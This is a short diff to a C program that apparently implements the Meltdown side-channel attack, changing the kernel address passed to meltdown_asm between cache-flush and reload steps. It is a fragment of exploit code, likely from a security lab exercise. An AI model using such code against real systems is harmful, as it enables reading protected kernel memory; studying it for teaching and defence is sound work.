@@ -100,7 +100,7 @@ int main()
 	for (j = 0; j < 256; j++) 
 		_mm_clflush(&array[j * 4096 + DELTA]);
 
-	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
+	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xf9c91000); }
 
 	reloadSideChannelImproved();
   }
